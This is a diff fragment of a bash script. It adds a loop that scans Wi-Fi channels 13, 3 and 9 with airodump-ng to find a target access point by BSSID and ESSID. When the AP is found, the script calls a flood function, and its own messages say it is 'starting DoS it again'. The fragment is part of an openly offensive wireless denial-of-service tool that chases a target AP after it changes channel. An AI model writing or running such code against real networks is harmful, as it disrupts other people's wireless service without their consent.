@@ -134,6 +134,57 @@ sleep 1;
 kill `cat /tmp/airodump.pid`
 rm -rf track*
 fi
+
+canal=13
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track13 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track13-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 13, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel 13... searching it again...\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
+
+canal=3
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track3 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track3-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 3, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel 3... searching it again...\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
+
+canal=9
+xterm -hold -bg '#000000' -fg '#3A94FF' -e airodump-ng --encrypt wpa -c ${canal} --essid ${ESSID} -w track9 ${intmoniteur} &> /dev/null &
+echo $! >/tmp/airodump.pid
+sleep 7;
+if grep -q "${BSSID}" "track9-01.kismet.csv" ; then 
+   echo -e "\t\e[1;32m [+] AP channel find on channel 9, starting DoS it again"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+f_floodinstantane
+else
+    echo -e "\e[1;31m [!] AP is not on channel  1 3 6 9 11 and 13... --NO SUCESS-- take manual control to find it!\e[0m"
+sleep 1;
+kill `cat /tmp/airodump.pid`
+rm -rf track*
+fi
 }
 
 
